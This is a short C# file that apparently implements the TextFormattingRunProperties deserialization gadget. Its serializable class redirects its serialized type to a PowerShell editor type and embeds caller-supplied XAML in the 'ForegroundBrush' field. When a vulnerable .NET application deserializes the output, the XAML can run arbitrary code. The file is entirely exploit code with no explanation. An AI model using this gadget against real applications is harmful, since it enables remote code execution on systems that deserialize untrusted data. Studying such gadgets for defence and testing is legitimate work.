using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    [Serializable]
    public class Class3 : ISerializable
    {
        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type t = Type.GetType("Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
            info.SetType(t);
            info.AddValue("ForegroundBrush", _xaml);
        }
        public Class3(string xaml)
        {
            _xaml = xaml;
        }
    }
}
